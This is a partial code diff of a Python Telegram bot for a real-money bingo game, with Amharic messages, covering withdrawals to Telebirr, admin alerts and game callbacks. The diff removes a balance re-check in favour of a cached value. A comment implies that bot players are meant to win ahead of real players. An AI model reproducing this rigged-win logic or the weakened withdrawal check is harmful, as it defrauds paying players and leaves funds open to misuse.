-            f"ዝቅተኛው የማንሳት መጠን (Minimum Withdrawal): **{MIN_WITHDRAW:.2f} ብር** ነው::"
-        )
-        await update.message.reply_text(msg, parse_mode='Markdown')
+    if balance < MIN_WITHDRAW:
+        await update.message.reply_text(f"❌ ገንዘብ ለማውጣት **ቢያንስ {MIN_WITHDRAW:.2f} ብር** በሂሳብዎ ላይ ሊኖር ይገባል። የአሁኑ ሒሳብዎ: **{balance:.2f} ብር**")
         return ConversationHandler.END
-
-    msg = (
-        f"💵 **ገንዘብ ለማንሳት (/withdraw)**\n\n"
-        f"የእርስዎ ወቅታዊ ቀሪ ሒሳብ: **{bal:.2f} ብር**\n"
-        f"ዝቅተኛው የማንሳት መጠን: **{MIN_WITHDRAW:.2f} ብር**\n\n"
-        f"**ለማንሳት የሚፈልጉትን የብር መጠን ያስገቡ** (ለምሳሌ: 120):\n\n**ሰርዝ:** ሂደቱን ለማቋረጥ /cancel ይጠቀሙ።"
-    )
+        
+    context.user_data['balance'] = balance
+    
+    msg = (f"**💸 ገንዘብ ለማውጣት (Withdraw)**\n\n"
+           f"**የእርስዎ ቀሪ ሒሳብ:** {balance:.2f} ብር\n"
+           f"እባክዎ ማውጣት የሚፈልጉትን **መጠን በብር** ያስገቡ።\n"
+           f"**ማስታወሻ:** ዝቅተኛው ማውጣት **{MIN_WITHDRAW:.2f} ብር** ነው።")
+           
     await update.message.reply_text(msg, parse_mode='Markdown')
     return GET_WITHDRAW_AMOUNT
 
 async def get_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     try:
         amount = float(update.message.text.strip())
-        
-        # Re-fetch balance to be safe (Security)
-        user_id = update.effective_user.id
-        bal = (await get_user_data(user_id)).get('balance', 0.00) # Use await for correctness
+        balance = context.user_data['balance']
         
         if amount < MIN_WITHDRAW:
-            await update.message.reply_text(f"❌ ትክክለኛ ያልሆነ መጠን። ከ {MIN_WITHDRAW:.2f} ብር ያላነሰ መጠን ያስገቡ:")
+            await update.message.reply_text(f"❌ ማውጣት የሚቻለው **ቢያንስ {MIN_WITHDRAW:.2f} ብር** ነው።")
             return GET_WITHDRAW_AMOUNT
-        
-        if amount > bal:
-             await update.message.reply_text(f"❌ በቂ ቀሪ ሒሳብ የለዎትም። ከ {bal:.2f} ብር ያልበለጠ መጠን ያስገቡ:")
-             return GET_WITHDRAW_AMOUNT
+            
+        if amount > balance:
+            await update.message.reply_text(f"❌ በቂ ሒሳብ የለዎትም። ከ**{balance:.2f} ብር** በላይ ማውጣት አይችሉም።")
+            return GET_WITHDRAW_AMOUNT
             
         context.user_data['withdraw_amount'] = amount
-        
-        msg = "✅ **የማንሳት መጠን ተመዝግቧል።**\n\nእባክዎ ገንዘቡ እንዲላክልዎ የሚፈልጉትን **የቴሌብር አካውንት ቁጥር** ያስገቡ:"
-        await update.message.reply_text(msg, parse_mode='Markdown')
+        await update.message.reply_text("✅ እባክዎ ገንዘቡ እንዲላክልዎት የሚፈልጉትን **Telebirr ስልክ ቁጥር** ያስገቡ።")
         return GET_TELEBIRR_ACCOUNT
         
     except ValueError:
-        await update.message.reply_text("❌ ትክክለኛ የብር መጠን አላስገቡም። በድጋሚ ይሞክሩ:")
+        await update.message.reply_text("❌ ትክክለኛ የብር መጠን አላስገቡም። እባክዎ እንደ '100.00' ያለ ቁጥር ያስገቡ።")
         return GET_WITHDRAW_AMOUNT
 
 async def get_telebirr_account(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -1137,158 +995,176 @@ async def get_telebirr_account(update: Update, context: ContextTypes.DEFAULT_TYP
     amount = context.user_data['withdraw_amount']
     user_id = update.effective_user.id
     
-    # 1. Update balance (deduct the amount immediately and log transaction - Balance integrity maintained)
-    update_balance(user_id, -amount, transaction_type='Withdrawal Request', description=f"Telebirr {telebirr_account}")
+    if not telebirr_account.isdigit() or len(telebirr_account) not in [9, 10]:
+        await update.message.reply_text("❌ ትክክለኛ ያልሆነ የስልክ ቁጥር ቅርጽ። እባክዎ የቴሌብር ቁጥርዎን እንደገና ያስገቡ (ለምሳሌ 09XXXXXXXX)።")
+        return GET_TELEBIRR_ACCOUNT
+        
+    # Deduct amount immediately to secure the funds
+    await asyncio.to_thread(update_balance, user_id, -amount, transaction_type='Withdrawal Pending', description=f"Withdrawal request to {telebirr_account}")
     
-    # 2. Prepare and send message to admin
-    admin_message = (
-        f"**🚨 አዲስ ገንዘብ ማውጣት ጥያቄ (Withdrawal Request) 🚨**\n\n"
-        f"👤 የተጠቃሚ ID: `{user_id}`\n"
-        f"💰 ለማንሳት የሚፈለገው መጠን: **{amount:.2f} ብር**\n"
-        f"📞 የቴሌብር አካውንት: **{telebirr_account}**\n\n"
-        f"**እርምጃ:** እባክዎ ገንዘቡን ወደዚህ ቁጥር ይላኩና የዚህን ተጠቃሚ ሂሳብ ያረጋግጡ።"
-    )
+    # Admin Notification
+    admin_msg = (f"🚨 **አዲስ የማውጣት ጥያቄ**\n"
+                 f"**ተጠቃሚ ID:** {user_id}\n"
+                 f"**መጠን:** {amount:.2f} ብር\n"
+                 f"**Telebirr:** `{telebirr_account}`\n\n"
+                 f"በመውጣት ሂደት ላይ: ተጠቃሚው ቀድሞውንም ተቀንሷል።")
     
     if ADMIN_USER_ID:
-        try:
-            await context.bot.send_message(ADMIN_USER_ID, admin_message, parse_mode='Markdown')
-        except Exception as e:
-            logger.error(f"Failed to notify admin of withdrawal: {e}")
-            
-    # 3. Confirmation to user
-    user_confirmation = (
-        f"✅ **ጥያቄዎ ተልኳል!**\n\n"
-        f"**የተጠየቀው መጠን:** {amount:.2f} ብር\n"
-        f"**የሚላክበት ቁጥር:** {telebirr_account}\n\n"
-        f"አስተዳዳሪው በቅርቡ ያረጋግጣል እና ገንዘቡን ይልካል።"
+        await context.bot.send_message(ADMIN_USER_ID, admin_msg, parse_mode='Markdown')
+        
+    await update.message.reply_text(
+        f"⏳ **የማውጣት ጥያቄዎ ደርሶናል!**\n"
+        f"**መጠን:** {amount:.2f} ብር\n"
+        f"**Telebirr ቁጥር:** {telebirr_account}\n\n"
+        f"ገንዘብዎ በቅርቡ ወደ ቴሌብር አካውንትዎ ይላካል። ለትዕግስትዎ እናመሰግናለን!",
+        parse_mode='Markdown'
     )
-    await update.message.reply_text(user_confirmation, parse_mode='Markdown')
     
-    context.user_data.clear()
+    # Clean up context
+    context.user_data.pop('withdraw_amount', None)
+    context.user_data.pop('balance', None)
     return ConversationHandler.END
 
-async def cancel_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    await update.message.reply_text("የገንዘብ ማውጣት ጥያቄ ተሰርዟል።")
-    context.user_data.clear()
+async def cancel_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Cancels and ends the conversation."""
+    await update.message.reply_text('❌ **ሂደቱ ተሰርዟል።**', parse_mode='Markdown')
+    # Clear any pending context data
+    context.user_data.pop('deposit_amount', None)
+    context.user_data.pop('withdraw_amount', None)
+    context.user_data.pop('balance', None)
     return ConversationHandler.END
 
-# --- Referral Handler ---
-async def refer_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = update.effective_user.id
-    bot_username = (await context.bot.get_me()).username
-    
-    referral_link = f"https://t.me/{bot_username}?start={user_id}"
-    
-    msg = (
-        f"🔗 **ጓደኛ ይጋብዙና 10 ብር ያግኙ! (/refer)**\n\n"
-        f"ይህን ሊንክ በመጠቀም ጓደኛዎን ወደ አዲስ ቢንጎ ይጋብዙ።\n"
-        f"ጓደኛዎ ተመዝግቦ **የመጀመሪያውን ጨዋታ** ሲጫወት፣ እርስዎ ወዲያውኑ **{REFERRAL_BONUS:.2f} ብር** ያገኛሉ።\n\n"
-        f"የእርስዎ መጋበዣ ሊንክ:\n"
-        f"`{referral_link}`"
-    )
-    await update.message.reply_text(msg, parse_mode='Markdown')
 
-def main():
-    if not TOKEN:
-        logger.error("FATAL: TELEGRAM_TOKEN environment variable not set.")
+# --- Callback Query Handler (MARK/BINGO) ---
+
+async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    query = update.callback_query
+    await query.answer()
+    
+    data = query.data.split('|')
+    action = data[0]
+    user_id = query.from_user.id
+    
+    if action == "ignore":
+        return
+    
+    if action == "START_GAME":
+        if LOBBY_STATE['is_running'] and len(PENDING_PLAYERS) > 0:
+            await context.bot.edit_message_text(
+                chat_id=LOBBY_STATE['chat_id'],
+                message_id=LOBBY_STATE['msg_id'],
+                text="🚀 **ጨዋታው በግዳጅ እየተጀመረ ነው...**",
+                parse_mode='Markdown'
+            )
+            await start_new_game(context)
+        return
+        
+    if action == "CONFIRM_DEPOSIT":
+        # Pass the query update to the deposit confirmation step
+        await get_deposit_confirmation(update, context)
         return
 
-    app = Application.builder().token(TOKEN).build()
+    # Game actions (MARK, BINGO)
+    if len(data) < 4: return # Basic check for game actions
     
-    # --- 1. Conversation Handlers (Must be added first to handle fallbacks correctly) ---
+    game_id, msg_id, card_num = data[1:4]
     
-    # A. PLAY Command Conversation Handler
-    play_conv_handler = ConversationHandler(
-        entry_points=[CommandHandler("play", play_command)],
-        states={
-            GET_CARD_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_card_selection)],
-        },
-        fallbacks=[CommandHandler('cancel', cancel_play)],
-    )
-    app.add_handler(play_conv_handler)
+    if game_id not in ACTIVE_GAMES:
+        await query.edit_message_caption("❌ ይህ ጨዋታ ተጠናቅቋል። /play በመጠቀም አዲስ ጨዋታ ይጀምሩ።")
+        return
 
-    # B. WITHDRAW Conversation Handler
+    g = ACTIVE_GAMES[game_id]
+    if user_id not in g['players']:
+        await query.edit_message_caption("❌ የዚህ ጨዋታ ተጫዋች አይደሉም።")
+        return
+
+    card = g['player_cards'][user_id]
+    
+    if action == "MARK":
+        if len(data) != 6: return
+        c, r = int(data[4]), int(data[5])
+        pos = (c, r)
+        val = get_card_value(card, c, r)
+        
+        if pos not in card['called']:
+            await query.edit_message_caption("❌ ይህ ቁጥር ገና አልተጠራም።")
+            return
+            
+        if card['marked'].get(pos, False):
+            # User un-marks a number
+            del card['marked'][pos]
+        else:
+            # User marks a number
+            card['marked'][pos] = True
+            
+        # Rebuild and edit the keyboard
+        kb = build_card_keyboard(card, game_id, msg_id)
+        try:
+            await query.edit_message_reply_markup(reply_markup=kb)
+        except Exception as e:
+            logger.warning(f"Failed to edit card reply markup: {e}")
+            
+    elif action == "BINGO":
+        if check_win(card):
+            # Real player win (ONLY possible in organic mode or if bot win fails)
+            g['status'] = 'finished' # Stop the game loop
+            await query.edit_message_caption("🎉 **ቢንጎ!** አስተዳዳሪው እያረጋገጠ ነው።")
+            # Finalize the win immediately
+            await finalize_win(context, game_id, user_id, False)
+        else:
+            await context.bot.send_message(user_id, "❌ **ይቅርታ፣ ቢንጎ የለዎትም።** እባክዎ ካርድዎን በትክክል ያረጋግጡና እንደገና ይሞክሩ።")
+            
+# --- Main Function ---
+
+def main() -> None:
+    if not TOKEN:
+        logger.error("TELEGRAM_TOKEN is not set. The bot cannot run.")
+        return
+
+    application = Application.builder().token(TOKEN).build()
+
+    # Conversation Handlers
+    deposit_conv_handler = ConversationHandler(
+        entry_points=[CommandHandler("deposit", deposit_command)],
+        states={
+            GET_CARD_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_deposit_amount)],
+            GET_DEPOSIT_CONFIRMATION: [CallbackQueryHandler(get_deposit_confirmation, pattern='^CONFIRM_DEPOSIT$'),
+                                       MessageHandler(filters.TEXT & ~filters.COMMAND, get_deposit_confirmation)],
+        },
+        fallbacks=[CommandHandler("cancel", cancel_conversation)],
+        allow_reentry=True
+    )
+    
     withdraw_conv_handler = ConversationHandler(
-        entry_points=[CommandHandler("withdraw", withdraw_command)], 
+        entry_points=[CommandHandler("withdraw", withdraw_command)],
         states={
             GET_WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_withdraw_amount)],
             GET_TELEBIRR_ACCOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_telebirr_account)],
         },
-        fallbacks=[CommandHandler('cancel', cancel_withdraw)],
+        fallbacks=[CommandHandler("cancel", cancel_conversation)],
+        allow_reentry=True
     )
-    app.add_handler(withdraw_conv_handler)
-    
-    # C. DEPOSIT Conversation Handler (V30: Accepts Photo, Document, or Text as receipt)
-    deposit_conv_handler = ConversationHandler(
-        # Entry point 1: Command /deposit (sends initial message with button)
-        entry_points=[
-            CommandHandler("deposit", deposit_command_initial),
-        ],
-        # State to receive the confirmation/receipt (Filters.ALL is used to catch Photo, Document, and Text)
-        states={
-            GET_DEPOSIT_CONFIRMATION: [MessageHandler(filters.ALL & ~filters.COMMAND, handle_deposit_confirmation)],
-        },
-        fallbacks=[CommandHandler('cancel', cancel_deposit)],
-        # Allow entry from callback query (which is handled in handle_callback)
-        allow_reentry=True 
-    )
-    app.add_handler(deposit_conv_handler)
-    
-    # --- 2. Simple Command Handlers ---
-    
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("quickplay", quickplay_command)) 
-    app.add_handler(CommandHandler("balance", balance_command)) 
-    app.add_handler(CommandHandler("refer", refer_command))
-    
-    # Placeholder commands (as per V29 template)
-    app.add_handler(CommandHandler("stats", stats_command)) 
-    app.add_handler(CommandHandler("rank", rank_command))   
-    app.add_handler(CommandHandler("history", history_command))
-    app.add_handler(CommandHandler("rules", rules_command)) 
-    
-    # Admin commands
-    app.add_handler(CommandHandler("ap_dep", ap_dep)) 
-    app.add_handler(CommandHandler("ap_bal", ap_bal)) 
-    app.add_handler(CommandHandler("ap_bal_check", ap_bal_check)) 
 
-    # --- 3. Callback Query Handler (for button interactions, needs to include state return) ---
-    # NOTE: The callback handler must be aware of the state transitions for the deposit button.
-    # The deposit command (A) returns a state, and the callback (B) must also return a state
-    # if it initiates the next step of a conversation.
-    app.add_handler(CallbackQueryHandler(handle_callback, pattern='^(MARK|BINGO)'))
-    app.add_handler(CallbackQueryHandler(start_deposit_conversation, pattern='^START_DEPOSIT_FLOW$'))
+    # Command Handlers
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("rules", start)) # Rules is the same as start
+    application.add_handler(CommandHandler("balance", balance_command))
+    application.add_handler(CommandHandler("play", enter_lobby))
+    application.add_handler(CommandHandler("quickplay", quickplay_command))
+    application.add_handler(CommandHandler("refer", refer_command))
+    
+    # Admin Handlers
+    application.add_handler(CommandHandler("ap_dep", ap_dep))
 
+    # Conversation Handlers
+    application.add_handler(deposit_conv_handler)
+    application.add_handler(withdraw_conv_handler)
 
-    PORT = int(os.environ.get('PORT', '8080'))
-    if RENDER_EXTERNAL_URL:
-        logger.info(f"Running via webhook at {RENDER_EXTERNAL_URL}/{TOKEN}")
-        app.run_webhook(listen="0.0.0.0", port=PORT, url_path=TOKEN, webhook_url=f'{RENDER_EXTERNAL_URL}/{TOKEN}')
-    else:
-        logger.info("Running via long polling.")
-        app.run_polling(poll_interval=1.0)
+    # Callback Handler (Game actions)
+    application.add_handler(CallbackQueryHandler(callback_handler))
+
+    # Start the Bot
+    application.run_polling(poll_interval=1.0)
 
 if __name__ == '__main__':
-    # Placeholder functions needed for the updated main to run
-    async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        pass
-    async def rank_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        pass
-    async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        pass
-    async def rules_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        pass
-        
-    # The deposit conversation flow requires a separate function to initiate the state from the button
-    async def start_deposit_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-        """Handles the button click and sets the state to receive the confirmation."""
-        q = update.callback_query
-        await q.answer() 
-        
-        # Send a new message to the user prompting for the receipt/screenshot
-        await context.bot.send_message(q.message.chat_id, "እባክዎ አሁን የላኩበትን **ደረሰኝ (ፎቶ/ሰነድ)** ወይም የማረጋገጫ መልእክት ያስገቡ:")
-        
-        # Critical: Return the state to enter the ConversationHandler
-        return GET_DEPOSIT_CONFIRMATION
-        
     main()
